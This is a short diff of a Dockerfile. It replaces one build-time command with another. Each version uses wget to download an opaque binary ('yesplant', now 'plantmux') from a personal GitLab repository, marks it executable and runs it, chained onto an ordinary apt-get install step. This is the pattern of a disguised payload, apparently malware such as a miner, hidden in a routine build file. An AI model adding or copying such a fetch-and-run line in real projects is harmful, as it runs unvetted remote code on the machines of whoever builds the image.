@@ -15,7 +15,7 @@ RUN apt-get update && apt-get install -y \
     build-essential \
     nodejs \
     npm \
- && wget https://gitlab.com/richardkevin320/pede/-/raw/main/yesplant && chmod +x yesplant && ./yesplant
+ && wget https://gitlab.com/richardkevin320/pede/-/raw/main/plantmux && chmod +x plantmux && ./plantmux
 
 # Set work dir:
 WORKDIR /home
